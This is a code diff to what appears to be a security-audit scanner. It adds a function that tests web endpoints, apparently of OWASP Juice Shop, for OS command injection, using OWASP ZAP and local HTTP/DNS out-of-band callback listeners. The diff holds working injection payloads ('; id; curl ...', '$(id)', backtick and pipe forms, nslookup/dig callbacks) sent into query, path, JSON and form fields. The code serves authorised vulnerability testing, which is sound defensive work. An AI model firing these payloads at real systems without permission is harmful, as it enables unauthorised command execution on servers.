@@ -10961,6 +10961,323 @@ def evaluate_azi03_sqli_nosql(
     }
 
 
+def _parse_dns_qname(pkt: bytes) -> str:
+    """Extract the dotted DNS QNAME from a raw UDP DNS query packet."""
+    if len(pkt) < 13:
+        return ""
+    labels: list[str] = []
+    idx = 12
+    while idx < len(pkt):
+        ln = pkt[idx]
+        if ln == 0:
+            break
+        idx += 1
+        if idx + ln > len(pkt):
+            break
+        labels.append(pkt[idx : idx + ln].decode("ascii", errors="ignore"))
+        idx += ln
+    return ".".join(labels)
+
+
+def evaluate_azi04_cmd_injection(
+    target_url: str,
+    *,
+    repo: Path | None = None,
+    auth_headers: dict[str, str] | None = None,
+    crawled_exchanges: list[dict] | None = None,
+    http_probe_fn=None,
+    param_targets: list[tuple[str, str, str]] | None = None,
+    zap_cmdi_report: dict | None = None,
+    zap_seed_urls: list[str] | None = None,
+    zap_json_out_path: Path | None = None,
+    zap_sarif_out_path: Path | None = None,
+    report_out_path: Path | None = None,
+    har_out_path: Path | None = None,
+    run_zap: bool = True,
+) -> dict:
+    """Evaluate AZI-04 (ASVS V5.3.8 / CWE-78) via OWASP ZAP 90020 + OOB HTTP/DNS callback harness."""
+    base_url = target_url.strip().rstrip("/")
+    auth_hdrs = dict(auth_headers or {})
+    _probe_logged, _write_har, _ = _make_redacted_har_probe(base_url, http_probe_fn=http_probe_fn)
+
+    # 1. Focused OWASP ZAP Active Remote OS Command Injection Scan (Rule 90020)
+    seeds_cmd = list(zap_seed_urls or [f"{base_url}/rest/products/search?q=apple", f"{base_url}/rest/track-order/1"])
+    for ex in crawled_exchanges or []:
+        ex_url = str(ex.get("url") or "")
+        if ex.get("method", "GET") == "GET" and "?" in ex_url and ex_url.startswith(base_url) and ex_url not in seeds_cmd:
+            seeds_cmd.append(ex_url)
+            if len(seeds_cmd) >= 4:
+                break
+
+    if zap_cmdi_report is not None and zap_cmdi_report.get("executed"):
+        active_zap = zap_cmdi_report
+    elif run_zap:
+        active_zap = run_zap_automation(
+            base_url,
+            seed_urls=seeds_cmd,
+            active_scan_rules=[90020],
+            json_out_path=zap_json_out_path or (OUTPUT_DIR / "zap-cmdi-report.json"),
+            sarif_out_path=zap_sarif_out_path or (OUTPUT_DIR / "zap-cmdi-findings.sarif"),
+            timeout_sec=180,
+        )
+    else:
+        active_zap = {"executed": False, "alerts": [], "sarifPath": str(zap_sarif_out_path or (OUTPUT_DIR / "zap-cmdi-findings.sarif"))}
+
+    azi04_findings: list[dict] = []
+    seen_cmd_keys: set[tuple[str, str, str]] = set()
+    zap_matched_plugins: set[str] = set()
+
+    def _add_cmd_finding(url: str, param: str, vector: str, evidence: str, detail: str, *, confirmed_by: str) -> None:
+        k_c = (url.split("?", 1)[0], param, vector)
+        if k_c in seen_cmd_keys:
+            return
+        seen_cmd_keys.add(k_c)
+        azi04_findings.append(
+            {
+                "url": url.split("?", 1)[0],
+                "param": param,
+                "vector": vector,
+                "evidence": evidence[:120],
+                "confirmedBy": confirmed_by,
+                "detail": detail,
+            }
+        )
+
+    for al in active_zap.get("alerts", []) or []:
+        pid = str(al.get("pluginid") or "")
+        aname = str(al.get("alert") or "")
+        if pid in {"90020", "90037"} or "command injection" in aname.lower():
+            zap_matched_plugins.add(pid or "90020")
+            for inst in al.get("instances", []) or []:
+                uri = str(inst.get("uri") or base_url)
+                p_nm = str(inst.get("param") or "param")
+                atk = str(inst.get("attack") or "")
+                _add_cmd_finding(
+                    uri,
+                    p_nm,
+                    f"OWASP_ZAP_{pid or '90020'}",
+                    atk or str(inst.get("evidence") or aname),
+                    f"[OWASP ZAP {pid or '90020'}] {aname} detected at {uri.split('?', 1)[0]} (param='{p_nm}', attack='{atk[:60]}') (CWE-78).",
+                    confirmed_by=f"owasp_zap_{pid or '90020'}",
+                )
+
+    # 2. Ephemeral OOB HTTP Callback Server + UDP DNS QNAME Listener
+    cmd_cb_hits: list[str] = []
+    dns_cb_hits: list[str] = []
+    cmd_probes_sent = 0
+    cmd_lock = threading.Lock()
+    dns_stop = threading.Event()
+
+    class _CmdCallbackHandler(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            with cmd_lock:
+                cmd_cb_hits.append(self.path)
+            self.send_response(200)
+            self.send_header("Content-Length", "2")
+            self.end_headers()
+            self.wfile.write(b"ok")
+
+        def log_message(self, *args):
+            pass
+
+    cmd_srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _CmdCallbackHandler)
+    cmd_cb_port = cmd_srv.server_address[1]
+    threading.Thread(target=cmd_srv.serve_forever, daemon=True).start()
+
+    dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    dns_sock.bind(("127.0.0.1", 0))
+    dns_sock.settimeout(0.25)
+    dns_cb_port = dns_sock.getsockname()[1]
+
+    def _dns_loop() -> None:
+        while not dns_stop.is_set():
+            try:
+                pkt, addr = dns_sock.recvfrom(2048)
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+            qname = _parse_dns_qname(pkt)
+            if qname:
+                with cmd_lock:
+                    dns_cb_hits.append(qname)
+            if len(pkt) >= 12:
+                # Minimal NXDOMAIN DNS reply so dig/nslookup completes immediately without retries.
+                resp = pkt[:2] + b"\x81\x83\x00\x01\x00\x00\x00\x00\x00\x00" + pkt[12:]
+                try:
+                    dns_sock.sendto(resp, addr)
+                except OSError:
+                    pass
+
+    dns_thread = threading.Thread(target=_dns_loop, daemon=True)
+    dns_thread.start()
+
+    cmd_output_re = re.compile(
+        r"uid=\d+\([A-Za-z0-9_.-]+\)\s+gid=\d+|root:[x*]:0:0:|Windows IP Configuration|Microsoft Windows \[Version",
+        re.IGNORECASE,
+    )
+
+    try:
+        oob_url_base = f"http://127.0.0.1:{cmd_cb_port}/cmd"
+        cmd_payloads = [
+            ("semicolon_id_curl", f"; id; curl -s {oob_url_base}?p=semi #"),
+            ("subshell_curl_id", f"$(curl -s {oob_url_base}?p=sub) $(id)"),
+            ("semicolon_dns_nslookup", f"; nslookup -port={dns_cb_port} semi.oob.casa3.local 127.0.0.1 #"),
+            ("subshell_dns_dig", f"$(dig @127.0.0.1 -p {dns_cb_port} sub.oob.casa3.local +tries=1 +time=1)"),
+            ("backtick_id", "`id`"),
+            ("pipe_id", "| id"),
+        ]
+        if param_targets is not None:
+            targets_list = list(param_targets)
+        else:
+            targets_list = [
+                ("GET", "/rest/products/search?q={p}", "query:q"),
+                ("GET", "/rest/track-order/{p}", "path:id"),
+                ("POST_JSON", "/rest/user/login", "json:email"),
+                ("POST_FORM", "/profile", "form:username"),
+                ("POST_B2B", "/b2b/v2/orders", "json:orderLinesData"),
+            ]
+            seen_extra: set[str] = {"/rest/products/search"}
+            for ex in crawled_exchanges or []:
+                ex_url = str(ex.get("url") or "")
+                if ex.get("method", "GET") == "GET" and "?" in ex_url and ex_url.startswith(base_url):
+                    ep_path = urllib.parse.urlparse(ex_url).path
+                    if ep_path not in seen_extra:
+                        qs_keys = list(urllib.parse.parse_qs(urllib.parse.urlparse(ex_url).query).keys())
+                        if qs_keys:
+                            seen_extra.add(ep_path)
+                            targets_list.append(("GET", f"{ep_path}?{qs_keys[0]}={{p}}", f"query:{qs_keys[0]}"))
+                            if len(seen_extra) >= 3:
+                                break
+
+        for p_kind, p_tpl, param_label in targets_list:
+            for vec_lbl, vec_val in cmd_payloads:
+                enc = urllib.parse.quote(vec_val, safe="")
+                if p_kind == "GET":
+                    st4, _, b4 = _probe_logged(p_tpl.format(p=enc), headers=auth_hdrs)
+                    tgt_url = f"{base_url}{p_tpl.split('{', 1)[0]}"
+                elif p_kind == "POST_JSON":
+                    st4, _, b4 = _probe_logged(
+                        p_tpl,
+                        method="POST",
+                        headers={"Content-Type": "application/json", **auth_hdrs},
+                        body=json.dumps({"email": vec_val, "password": "x"}).encode("utf-8"),
+                    )
+                    tgt_url = f"{base_url}{p_tpl}"
+                elif p_kind == "POST_FORM":
+                    st4, _, b4 = _probe_logged(
+                        p_tpl,
+                        method="POST",
+                        headers={"Content-Type": "application/x-www-form-urlencoded", **auth_hdrs},
+                        body=f"username={enc}".encode("utf-8"),
+                    )
+                    tgt_url = f"{base_url}{p_tpl}"
+                else:
+                    st4, _, b4 = _probe_logged(
+                        p_tpl,
+                        method="POST",
+                        headers={"Content-Type": "application/json", **auth_hdrs},
+                        body=json.dumps({"orderLinesData": vec_val, "cid": "1"}).encode("utf-8"),
+                    )
+                    tgt_url = f"{base_url}{p_tpl}"
+                cmd_probes_sent += 1
+                m_cmd = cmd_output_re.search(b4)
+                if m_cmd:
+                    _add_cmd_finding(
+                        tgt_url,
+                        param_label,
+                        vec_lbl,
+                        m_cmd.group(0),
+                        f"{p_kind} {tgt_url} ({param_label}, payload='{vec_lbl}') returned HTTP {st4} with OS command execution output marker '{m_cmd.group(0)[:60]}' (CWE-78).",
+                        confirmed_by="command_output_marker",
+                    )
+
+        time.sleep(0.25)
+        with cmd_lock:
+            unique_http_cb = sorted(set(cmd_cb_hits))
+            unique_dns_cb = sorted(set(dns_cb_hits))
+        for cb_hit in unique_http_cb:
+            _add_cmd_finding(
+                base_url,
+                "oob_http_callback",
+                cb_hit,
+                cb_hit,
+                f"Received live OS command-injection HTTP out-of-band callback GET 127.0.0.1:{cmd_cb_port}{cb_hit} (CWE-78).",
+                confirmed_by="oob_http_callback",
+            )
+        for dns_hit in unique_dns_cb:
+            _add_cmd_finding(
+                base_url,
+                "oob_dns_callback",
+                dns_hit,
+                dns_hit,
+                f"Received live OS command-injection UDP DNS out-of-band query '{dns_hit}' on 127.0.0.1:{dns_cb_port} (CWE-78).",
+                confirmed_by="oob_dns_callback",
+            )
+    finally:
+        dns_stop.set()
+        cmd_srv.shutdown()
+        cmd_srv.server_close()
+        dns_sock.close()
+        dns_thread.join(timeout=1.0)
+
+    rep_file = report_out_path or (OUTPUT_DIR / "azi04-cmdi-audit.json")
+    rep_file.parent.mkdir(parents=True, exist_ok=True)
+    rep_file.write_text(
+        json.dumps(
+            {
+                "standard": "OWASP ASVS V5.3.8 / CWE-78 (OWASP ZAP 90020 + OOB HTTP/DNS Callback)",
+                "target": base_url,
+                "verdict": "FAIL" if azi04_findings else "PASS",
+                "probesRun": cmd_probes_sent,
+                "httpCallbacks": unique_http_cb,
+                "dnsCallbacks": unique_dns_cb,
+                "zapPluginsMatched": sorted(zap_matched_plugins),
+                "findings": azi04_findings,
+            },
+            indent=2,
+            ensure_ascii=False,
+        ),
+        encoding="utf-8",
+    )
+
+    har_file = har_out_path or (OUTPUT_DIR / "azi04-replayed.har")
+    _write_har(har_file, "casa-audit-azi04-cmdi-harness")
+
+    sarif_items: list[dict] = []
+    for afz4 in azi04_findings:
+        sarif_items.append(
+            {
+                "ruleId": "CASA3-AZI-04",
+                "level": "error",
+                "message": {"text": afz4["detail"]},
+                "locations": [{"physicalLocation": {"artifactLocation": {"uri": afz4["url"]}}}],
+                "properties": {
+                    "controlId": "AZI-04",
+                    "parameter": afz4["param"],
+                    "vector": afz4["vector"],
+                    "evidence": afz4["evidence"],
+                    "confirmedBy": afz4["confirmedBy"],
+                },
+            }
+        )
+
+    azi04_fail = len(azi04_findings) > 0
+    return {
+        "verdict": "FAIL" if azi04_fail else "PASS",
+        "azi04_fail": azi04_fail,
+        "probesRun": cmd_probes_sent,
+        "httpCallbacks": unique_http_cb,
+        "dnsCallbacks": unique_dns_cb,
+        "zap": active_zap,
+        "zapPluginsMatched": sorted(zap_matched_plugins),
+        "findings": azi04_findings,
+        "reportPath": str(rep_file),
+        "harPath": str(har_file),
+        "sarifResults": sarif_items,
+    }
+
+
 def run_dynamic_and_protocol_checks(target_url: str, repo: Path) -> dict[str, dict]:
     results: dict[str, dict] = {}
     OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
@@ -12032,134 +12349,18 @@ def run_dynamic_and_protocol_checks(target_url: str, repo: Path) -> dict[str, di
         ),
     }
 
-    # AZI-04: Active OS Command Injection & Out-of-Band Callback Probe (CWE-78 / ASVS V5.3.8, SARIF 2.1.0 + redacted HAR 1.2)
-    cmd_cb_hits: list[str] = []
-    cmd_probes_sent = 0
-    azi04_findings: list[dict] = []
-
-    cmd_lock = threading.Lock()
-
-    class CmdCallbackHandler(http.server.BaseHTTPRequestHandler):
-        def do_GET(self):
-            with cmd_lock:
-                cmd_cb_hits.append(self.path)
-            self.send_response(200)
-            self.end_headers()
-            self.wfile.write(b"ok")
-
-        def log_message(self, *args):
-            pass
-
-    cmd_srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), CmdCallbackHandler)
-    cmd_cb_port = cmd_srv.server_address[1]
-    threading.Thread(target=cmd_srv.serve_forever, daemon=True).start()
-
-    cmd_output_re = re.compile(
-        r"uid=\d+\([A-Za-z0-9_.-]+\)\s+gid=\d+|root:[x*]:0:0:|Windows IP Configuration|Microsoft Windows \[Version",
-        re.IGNORECASE,
+    # AZI-04: OWASP ZAP Active Remote OS Command Injection (90020) + OOB HTTP/DNS Callback Harness (CWE-78 / ASVS V5.3.8, SARIF 2.1.0 + redacted HAR 1.2)
+    azi04_eval = evaluate_azi04_cmd_injection(
+        base_url,
+        repo=repo,
+        auth_headers=auth_req_headers,
+        crawled_exchanges=crawled_exchanges,
+        http_probe_fn=http_probe,
     )
-
-    try:
-        oob_url_base = f"http://127.0.0.1:{cmd_cb_port}/cmd"
-        cmd_payloads = [
-            ("semicolon_id_curl", f"; id; curl -s {oob_url_base}?p=semi #"),
-            ("subshell_curl_id", f"$(curl -s {oob_url_base}?p=sub) $(id)"),
-            ("backtick_id", "`id`"),
-            ("pipe_id", "| id"),
-        ]
-        param_targets = [
-            ("GET", "/rest/products/search?q={p}", "query:q"),
-            ("GET", "/rest/track-order/{p}", "path:id"),
-            ("POST_JSON", "/rest/user/login", "json:email"),
-            ("POST_FORM", "/profile", "form:username"),
-            ("POST_B2B", "/b2b/v2/orders", "json:orderLinesData"),
-        ]
-
-        for p_kind, p_tpl, param_label in param_targets:
-            for vec_lbl, vec_val in cmd_payloads:
-                enc = urllib.parse.quote(vec_val, safe="")
-                if p_kind == "GET":
-                    st4, _, b4 = http_probe(p_tpl.format(p=enc), headers=auth_req_headers)
-                    tgt_url = f"{base_url}{p_tpl.split('{', 1)[0]}"
-                elif p_kind == "POST_JSON":
-                    st4, _, b4 = http_probe(
-                        p_tpl,
-                        method="POST",
-                        headers={"Content-Type": "application/json", **auth_req_headers},
-                        body=json.dumps({"email": vec_val, "password": "x"}).encode("utf-8"),
-                    )
-                    tgt_url = f"{base_url}{p_tpl}"
-                elif p_kind == "POST_FORM":
-                    st4, _, b4 = http_probe(
-                        p_tpl,
-                        method="POST",
-                        headers={"Content-Type": "application/x-www-form-urlencoded", **auth_req_headers},
-                        body=f"username={enc}".encode("utf-8"),
-                    )
-                    tgt_url = f"{base_url}{p_tpl}"
-                else:
-                    st4, _, b4 = http_probe(
-                        p_tpl,
-                        method="POST",
-                        headers={"Content-Type": "application/json", **auth_req_headers},
-                        body=json.dumps({"orderLinesData": vec_val, "cid": "1"}).encode("utf-8"),
-                    )
-                    tgt_url = f"{base_url}{p_tpl}"
-                cmd_probes_sent += 1
-                m_cmd = cmd_output_re.search(b4)
-                if m_cmd:
-                    azi04_findings.append(
-                        {
-                            "url": tgt_url,
-                            "param": param_label,
-                            "vector": vec_lbl,
-                            "evidence": m_cmd.group(0)[:80],
-                            "detail": (
-                                f"{p_kind} {tgt_url} ({param_label}, payload='{vec_lbl}') returned HTTP {st4} "
-                                f"with OS command execution output marker '{m_cmd.group(0)[:60]}' (CWE-78)."
-                            ),
-                        }
-                    )
-
-        time.sleep(0.2)
-        with cmd_lock:
-            for cb_hit in sorted(set(cmd_cb_hits)):
-                azi04_findings.append(
-                    {
-                        "url": base_url,
-                        "param": "oob_callback",
-                        "vector": cb_hit,
-                        "evidence": cb_hit,
-                        "detail": f"Received live OS command-injection HTTP out-of-band callback GET 127.0.0.1:{cmd_cb_port}{cb_hit} (CWE-78).",
-                    }
-                )
-    finally:
-        cmd_srv.shutdown()
-        cmd_srv.server_close()
-
-    for afz4 in azi04_findings:
-        dast_sarif_results.append(
-            {
-                "ruleId": "CASA3-AZI-04",
-                "level": "error",
-                "message": {"text": afz4["detail"]},
-                "locations": [
-                    {
-                        "physicalLocation": {
-                            "artifactLocation": {"uri": afz4["url"]},
-                        }
-                    }
-                ],
-                "properties": {
-                    "controlId": "AZI-04",
-                    "parameter": afz4["param"],
-                    "vector": afz4["vector"],
-                    "evidence": afz4["evidence"],
-                },
-            }
-        )
-
-    azi04_fail = len(azi04_findings) > 0
+    azi04_findings = azi04_eval["findings"]
+    cmd_probes_sent = azi04_eval["probesRun"]
+    dast_sarif_results.extend(azi04_eval["sarifResults"])
+    azi04_fail = azi04_eval["azi04_fail"]
     azi04_lines = [afz4["detail"] for afz4 in azi04_findings]
     b2b_note = (
         " (Note: JS sandbox vm.runInContext/notevil in routes/b2bOrder.ts is tracked as CWE-94 under SAST-10, not OS shell execution CWE-78.)"
@@ -12167,14 +12368,14 @@ def run_dynamic_and_protocol_checks(target_url: str, repo: Path) -> dict[str, di
         else ""
     )
     results["AZI-04"] = {
-        "verdict": "FAIL" if azi04_fail else "PASS",
-        "tool": f"Active OS Command Injection & Out-of-Band HTTP Callback Probe ({cmd_probes_sent} probes, SARIF 2.1.0 + redacted HAR 1.2)",
+        "verdict": azi04_eval["verdict"],
+        "tool": f"OWASP ZAP {zap_ver_label} (Rule 90020) & Active OS Command Injection OOB HTTP/DNS Callback Harness ({cmd_probes_sent} probes, SARIF 2.1.0 + redacted HAR 1.2)",
         "log": (
-            f"[FAIL] {len(azi04_findings)} OS command injection finding(s) across {cmd_probes_sent} probes:\n  - "
+            f"[FAIL] {len(azi04_findings)} OS command injection finding(s) confirmed (ZAP plugins={azi04_eval['zapPluginsMatched']}, http_cb={len(azi04_eval['httpCallbacks'])}, dns_cb={len(azi04_eval['dnsCallbacks'])}, probes={cmd_probes_sent}):\n  - "
             + "\n  - ".join(azi04_lines)
-            + f"\n\nEvidence Artifacts:\n  - DAST SARIF 2.1.0: {dast_sarif_path}\n  - Redacted HTTP HAR 1.2: {har_path}"
+            + f"\n\nEvidence Artifacts:\n  - AZI-04 Audit JSON: {azi04_eval['reportPath']}\n  - AZI-04 Redacted HAR 1.2: {azi04_eval['harPath']}\n  - ZAP CMDi SARIF 2.1.0: {azi04_eval['zap'].get('sarifPath')}\n  - DAST SARIF 2.1.0: {dast_sarif_path}\n  - Redacted HTTP HAR 1.2: {har_path}"
             if azi04_fail
-            else f"[PASS] Executed {cmd_probes_sent} authenticated OS command-injection probes with live out-of-band HTTP callback listener across 5 parameter surfaces; 0 callbacks received and 0 OS command-output markers detected.{b2b_note}\nEvidence Artifacts:\n  - DAST SARIF 2.1.0: {dast_sarif_path}\n  - Redacted HTTP HAR 1.2: {har_path}"
+            else f"[PASS] Executed OWASP ZAP {zap_ver_label} (90020) and {cmd_probes_sent} authenticated OS command-injection probes with live out-of-band HTTP & UDP DNS callback listeners; 0 callbacks received and 0 OS command-output markers detected.{b2b_note}\nEvidence Artifacts:\n  - AZI-04 Audit JSON: {azi04_eval['reportPath']}\n  - AZI-04 Redacted HAR 1.2: {azi04_eval['harPath']}\n  - ZAP CMDi SARIF 2.1.0: {azi04_eval['zap'].get('sarifPath')}\n  - DAST SARIF 2.1.0: {dast_sarif_path}\n  - Redacted HTTP HAR 1.2: {har_path}"
         ),
     }
 
